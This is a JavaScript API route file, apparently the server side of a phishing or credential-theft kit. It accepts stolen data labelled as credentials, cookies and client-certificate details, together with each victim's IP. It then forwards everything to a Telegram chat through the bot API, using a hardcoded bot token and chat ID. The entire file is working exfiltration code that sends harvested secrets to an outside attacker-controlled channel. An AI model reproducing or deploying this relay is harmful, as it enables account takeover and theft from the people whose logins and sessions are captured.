// pages/api/relay.js

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, message: 'Method Not Allowed' });
  }

  const payload = req.body;
  const ip      = payload.ip || 'unknown';

  // Telegram bot config (move to env in production!)
  const telegramToken = process.env.TELEGRAM_TOKEN || '8196319945:AAHPEcumR9n3hASIXg9IdmkX06UIxQbK5R4';
  const chatId        = process.env.TELEGRAM_CHAT_ID || '-1002383824557';
  const apiUrl        = `https://api.telegram.org/bot${telegramToken}/sendMessage`;

  let text;

  // 1️⃣ New-style creds payload
  if (payload.type === 'creds' && typeof payload.data === 'string') {
    text = `🔑 Credentials from ${ip}:\n${payload.data}`;
  }
  // 2️⃣ New-style cookie payload
  else if (payload.type === 'cookies' && Array.isArray(payload.cookies)) {
    const lines = payload.cookies.map(c => `• ${c.name}: ${c.cookie}`);
    text = `🍪 Cookies from ${ip}:\n${lines.join('\n')}`;
  }
  // 3️⃣ New-style cert payload
  else if (payload.type === 'cert' && payload.cert) {
    const c = payload.cert;
    text =
      `🎫 Client Cert from ${ip}:\n` +
      `• Subject: ${c.subject}\n` +
      `• Issuer: ${c.issuer}\n` +
      `• Fingerprint: ${c.fingerprint}`;
  }
  // 4️⃣ Legacy fallback
  else if (typeof payload.data === 'string') {
    text = `IP: ${ip}\nData: ${payload.data}`;
  }
  else {
    console.warn('relay.js: unrecognized payload', payload);
    return res.status(400).json({ success: false, message: 'Bad payload shape' });
  }

  // Send the assembled text to Telegram
  try {
    const tgRes = await fetch(apiUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text })
    });

    if (!tgRes.ok) {
      const errText = await tgRes.text();
      console.error('Telegram API error:', errText);
      return res.status(502).json({ success: false, message: 'Telegram API error', details: errText });
    }

    return res.status(200).json({ success: true });
  } catch (err) {
    console.error('relay.js unexpected error:', err);
    return res.status(500).json({ success: false, message: 'Internal Server Error', error: err.message });
  }
}
